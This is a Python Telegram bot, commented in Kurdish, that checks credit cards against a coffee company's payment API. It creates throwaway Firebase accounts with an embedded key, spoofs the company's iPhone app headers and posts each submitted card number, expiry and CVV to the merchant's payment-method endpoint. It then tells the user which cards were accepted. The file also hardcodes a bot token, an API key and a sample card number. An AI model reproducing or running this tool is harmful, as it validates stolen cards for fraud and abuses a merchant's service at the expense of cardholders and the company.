import telebot
import requests
import time
import logging
import re
import json
from telebot import types

# ڕێکخستنی لۆگکردن
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# تۆکێنی بۆتی تێلێگرام - ئەمە بگۆڕە بە تۆکێنی خۆت
BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"

bot = telebot.TeleBot(BOT_TOKEN)

# دۆمەینی ئامانج
DOMAIN = "prod.getoctanecoffee.com"
TARGET_URL = "https://prod.getoctanecoffee.com/v1/create-user-payment-method"

# ئەم فەنکشنە تۆکێنی فایربەیس بۆ بەکارهێنەرێک وەردەگرێتەوە
def get_firebase_token(email, password):
    try:
        url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser?key=AIzaSyBauEaaARhxqIaJSZtjnDXxfqRkpulPOTI"
        
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "X-Client-Version": "Mobile/JsCore/8.10.1/FirebaseCore-web",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "Origin": "capacitor://localhost"
        }
        
        data = {
            "email": email,
            "password": password,
            "returnSecureToken": True
        }
        
        response = requests.post(url, headers=headers, json=data)
        response_data = response.json()
        
        if "idToken" in response_data:
            return {
                "status": "success",
                "token": response_data["idToken"],
                "uid": response_data["localId"]
            }
        else:
            error_message = response_data.get("error", {}).get("message", "هەڵەیەکی نەناسراو")
            return {
                "status": "error",
                "message": error_message
            }
    
    except Exception as e:
        logger.error(f"هەڵە لە کاتی وەرگرتنی تۆکێن: {str(e)}")
        return {
            "status": "error",
            "message": f"هەڵەی سیستەم: {str(e)}"
        }

# فەنکشنی چێککردنی کرێدیت کارد
def check_credit_card(card_number, exp_month, exp_year, cvv):
    try:
        # بەکارهێنانی ئیمەیڵێک بۆ تۆمارکردن
        email = f"test{int(time.time())}@gmail.com"
        password = "War112233$%"
        
        # وەرگرتنی تۆکێن
        token_result = get_firebase_token(email, password)
        
        if token_result["status"] != "success":
            return {
                "status": "error", 
                "message": f"هەڵە لە کاتی وەرگرتنی تۆکێن: {token_result['message']}"
            }
        
        # ئامادەکردنی هێدەر
        headers = {
            "Host": DOMAIN,
            "Accept": "application/json, text/plain, */*",
            "Authorization": f"Bearer {token_result['token']}",
            "Content-Type": "application/json",
            "Origin": "capacitor://localhost",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        }
        
        # ئامادەکردنی داتا
        data = {
            "uid": token_result["uid"],
            "name": "John Doe",
            "zip": "10080",
            "cardNumber": card_number,
            "ccv": cvv,
            "expiryMonth": exp_month,
            "expiryYear": exp_year
        }
        
        # ناردنی داواکاری
        response = requests.post(TARGET_URL, headers=headers, json=data)
        
        # وەرگرتنی وەڵام وەک JSON
        try:
            response_json = response.json()
        except:
            response_json = {"error": "وەڵامی نەگونجاو"}
        
        # شیکردنەوەی ئەنجام
        if response.status_code == 200:
            return {
                "status": "success",
                "message": "کرێدیت کارد سەرکەوتوو بوو! ✅",
                "response": response_json
            }
        else:
            error_msg = response_json.get("error", "") or response_json.get("message", "")
            if not error_msg:
                error_msg = f"هەڵەی سێرڤەر: کۆدی {response.status_code}"
            
            return {
                "status": "error",
                "message": f"هەڵە: {error_msg}",
                "response": response_json
            }
    
    except Exception as e:
        logger.error(f"هەڵە لە کاتی چێککردنی کارت: {str(e)}")
        return {
            "status": "error", 
            "message": f"هەڵەی سیستەم: {str(e)}",
            "response": {"error": str(e)}
        }

# کۆماندی سەرەتا
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, 
                "بەخێربێیت بۆ بۆتی چێککردنی کرێدیت کارد!\n\n"
                "تەنها ژمارەی کرێدیت کارد، مانگ، ساڵ و CVV بنێرە بەم شێوەیە:\n"
                "ژمارەی_کارت|مانگ|ساڵ|CVV\n\n"
                "نموونە:\n"
                "`4147202728342336|02|30|885`")

# کۆماندی یارمەتی
@bot.message_handler(commands=['help'])
def help_command(message):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("چێککردنی کارت", callback_data="check_card_info")
    )
    
    bot.reply_to(message, 
                "🔹 شێوازی چێککردنی کارت:\n"
                "ژمارەی_کارت|مانگ|ساڵ|CVV\n\n"
                "🔹 نموونە:\n"
                "`4147202728342336|02|30|885`", 
                reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "check_card_info")
def check_card_info_callback(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, 
                    "بۆ چێککردنی کارت تەنها ژمارەی کارت، مانگ، ساڵ و CVV بنێرە بەم شێوەیە:\n"
                    "`4147202728342336|02|30|885`")

# وەرگرتنی کرێدیت کارد بە فۆرماتی داواکراو
@bot.message_handler(func=lambda message: bool(re.match(r'^\d+\|\d+\|\d+\|\d+$', message.text)))
def check_card_message(message):
    # جیاکردنەوەی زانیاریەکانی کارت
    card_parts = message.text.split('|')
    if len(card_parts) != 4:
        bot.reply_to(message, "تکایە داتای کارت بە دروستی بنووسە لەم فۆرماتە:\n`ژمارەی_کارت|مانگ|ساڵ|CVV`")
        return
    
    card_number = card_parts[0].strip()
    exp_month = card_parts[1].strip()
    exp_year = card_parts[2].strip()
    cvv = card_parts[3].strip()
    
    # ڕێکخستنی ساڵ (ئەگەر دوو ژمارەیی بێت)
    if len(exp_year) == 2:
        exp_year = "20" + exp_year
    
    # نیشاندانی پەیامێک کە چێککردن بەڕێوەیە
    wait_message = bot.reply_to(message, "تکایە چاوەڕێ بکە، چێککردنی کارت بەڕێوەیە... ⏳")
    
    # چێککردنی کارت
    result = check_credit_card(card_number, exp_month, exp_year, cvv)
    
    # ئامادەکردنی وەڵامی API بۆ نیشاندان
    api_response = result.get("response", {})
    response_text_formatted = json.dumps(api_response, indent=2, ensure_ascii=False)
    
    # نیشاندانی ئەنجام
    if result["status"] == "success":
        response_text = (f"✅ سەرکەوتوو\n\n"
                         f"🔹 کارت: `{card_number}`\n"
                         f"🔹 بەسەرچوون: {exp_month}/{exp_year}\n"
                         f"🔹 CVV: {cvv}\n\n"
                         f"{result['message']}\n\n"
                         f"📋 وەڵامی API:\n"
                         f"```\n{response_text_formatted}\n```")
    else:
        response_text = (f"❌ سەرکەوتوو نەبوو\n\n"
                         f"🔹 کارت: `{card_number}`\n"
                         f"🔹 بەسەرچوون: {exp_month}/{exp_year}\n"
                         f"🔹 CVV: {cvv}\n\n"
                         f"{result['message']}\n\n"
                         f"📋 وەڵامی API:\n"
                         f"```\n{response_text_formatted}\n```")
    
    # ئەگەر وەڵام زۆر درێژ بوو، بیکە بە دوو پەیام
    if len(response_text) > 4000:
        part1 = (f"{'✅ سەرکەوتوو' if result['status'] == 'success' else '❌ سەرکەوتوو نەبوو'}\n\n"
                f"🔹 کارت: `{card_number}`\n"
                f"🔹 بەسەرچوون: {exp_month}/{exp_year}\n"
                f"🔹 CVV: {cvv}\n\n"
                f"{result['message']}")
        
        part2 = f"📋 وەڵامی API:\n```\n{response_text_formatted}\n```"
        
        # دەستکاریکردنی پەیامی چاوەڕوانی بۆ ئەنجامی کۆتایی
        bot.edit_message_text(part1, message.chat.id, wait_message.message_id)
        bot.send_message(message.chat.id, part2, parse_mode="Markdown")
    else:
        # دەستکاریکردنی پەیامی چاوەڕوانی بۆ ئەنجامی کۆتایی
        bot.edit_message_text(response_text, message.chat.id, wait_message.message_id, parse_mode="Markdown")

# وەرگرتنی پەیامە ئاساییەکان
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if "|" in message.text and len(message.text.split("|")) >= 2:
        bot.reply_to(message, "فۆرماتی نادروست. تکایە زانیاری کارت بەم شێوەیە بنێرە:\n`ژمارەی_کارت|مانگ|ساڵ|CVV`")
    else:
        bot.reply_to(message, "تکایە زانیاری کارت بەم شێوەیە بنێرە:\n`ژمارەی_کارت|مانگ|ساڵ|CVV`\n\nنموونە: `4147202728342336|02|30|885`")

# فەنکشنی سەرەکی بۆت
def main():
    logger.info("بۆت دەستی بە کارکردن کرد...")
    try:
        bot.infinity_polling()
    except Exception as e:
        logger.error(f"هەڵە لە بۆت: {str(e)}")

# خاڵی دەستپێکردن
if __name__ == "__main__":
    main()